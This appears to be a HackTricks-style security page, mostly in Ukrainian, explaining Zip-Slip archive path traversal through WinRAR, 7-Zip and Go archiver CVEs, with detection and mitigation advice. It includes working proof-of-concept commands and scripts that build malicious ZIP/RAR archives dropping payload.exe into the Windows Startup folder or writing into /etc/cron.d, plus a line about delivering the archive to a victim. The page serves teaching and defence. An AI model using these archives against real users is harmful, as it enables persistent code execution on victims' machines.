# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Огляд

Багато форматів архівів (ZIP, RAR, TAR, 7-ZIP тощо) дозволяють кожному запису мати власний **внутрішній шлях**. Коли утиліта для розпакування бездумно поважає цей шлях, спеціально сформоване ім'я файлу, що містить `..` або **абсолютний шлях** (наприклад `C:\Windows\System32\`), буде записано за межами обраного користувачем каталогу.
Цей клас вразливостей широко відомий як *Zip-Slip* або **archive extraction path traversal**.

Наслідки можуть варіюватися від перезапису довільних файлів до безпосереднього досягнення **remote code execution (RCE)** шляхом розміщення payload в **auto-run** місці, наприклад у папці Windows *Startup*.

## Корінь проблеми

1. Зловмисник створює архів, у якому один або кілька заголовків файлів містять:
* Відносні послідовності переходу (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Абсолютні шляхи (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Або спеціально створені **symlinks**, які вказують за межі цільового каталогу (поширено в ZIP/TAR на *nix*).
2. Жертва розпаковує архів за допомогою вразливого інструменту, який довіряє вбудованому шляху (або слідує за symlinks) замість того, щоб нормалізувати його або примусово обмежити розпакування під обраним каталогом.
3. Файл записується в розташування під контролем зловмисника і буде виконаний/завантажений наступного разу, коли система або користувач звернеться до цього шляху.

### .NET `Path.Combine` + `ZipArchive` traversal
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Якщо `entry.FullName` починається з `..\\` it traverses; якщо це є **absolute path** ліва компонента відкидається повністю, що призводить до **arbitrary file write** як extraction identity.
- Архів proof-of-concept для запису в суміжну директорію `app`, яку відслідковує плановий сканер:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Кинувши цей ZIP у моніторовану вхідну скриньку, отримаємо `C:\samples\app\0xdf.txt`, що підтверджує traversal поза `C:\samples\queue\` і дозволяє follow-on primitives (наприклад, DLL hijacks).

## Реальний приклад – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) не перевіряв імена файлів під час розпакування.
Зловмисний RAR-архів, що містить запис на кшталт:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
в результаті опиниться **поза** обраним каталогом виведення та у папці *Startup* користувача. Після входу в систему Windows автоматично виконує все, що там присутнє, забезпечуючи *постійний* RCE.

### Створення PoC-архіву (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – store file paths exactly as given (do **not** prune leading `./`).

Доставте `evil.rar` жертві та інструктуйте її розпакувати його за допомогою вразливої збірки WinRAR.

### Observed Exploitation in the Wild

ESET повідомила про spear-phishing кампанії RomCom (Storm-0978/UNC2596), які додавали RAR-архіви з використанням CVE-2025-8088 для розгортання кастомізованих backdoor та сприяння операціям ransomware.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – Перелічуйте записи архіву та позначайте будь-які імена, що містять `../`, `..\\`, *absolute paths* (`/`, `C:`) або записи типу *symlink*, ціль яких лежить за межами каталогу розпакування.
* **Canonicalisation** – Переконайтеся, що `realpath(join(dest, name))` все ще починається з `dest`. Відхиляйте інакше.
* **Sandbox extraction** – Розпаковуйте в тимчасовий каталог за допомогою *безпечного* екстрактора (наприклад, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) і перевіряйте, що отримані шляхи залишаються всередині каталогу.
* **Endpoint monitoring** – Сигналізуйте про нові виконувані файли, записані до `Startup`/`Run`/`cron` локацій незабаром після відкриття архіву WinRAR/7-Zip/тощо.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ and 7-Zip 25.00+ implement path/symlink sanitisation. Both tools still lack auto-update.
2. Extract archives with “**Do not extract paths**” / “**Ignore paths**” when possible.
3. On Unix, drop privileges & mount a **chroot/namespace** before extraction; on Windows, use **AppContainer** or a sandbox.
4. If writing custom code, normalise with `realpath()`/`PathCanonicalize()` **before** create/write, and reject any entry that escapes the destination.

## Additional Affected / Historical Cases

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
